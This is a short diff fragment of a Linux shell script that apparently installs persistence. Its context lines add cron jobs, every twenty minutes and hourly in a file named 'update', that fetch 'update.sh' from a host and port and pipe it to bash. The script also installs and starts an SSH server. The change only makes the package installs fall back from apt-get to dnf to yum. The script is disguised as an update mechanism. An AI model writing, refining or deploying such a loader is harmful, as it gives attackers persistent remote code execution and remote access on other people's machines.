@@ -27,8 +27,8 @@ echo "*/20 * * * * curl -L $host:$down_port/linux/update.sh |bash" >> /var/spool
 
 printf "#\!/bin/bash\ncurl -L $host:$down_port/linux/update.sh |bash\n" > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update
 
-apt-get install -y openssh-server
-dnf install -y openssh-server
+apt-get install -y openssh-server ||
+dnf install -y openssh-server ||
 yum install -y openssh-server
 
 systemctl start ssh.service
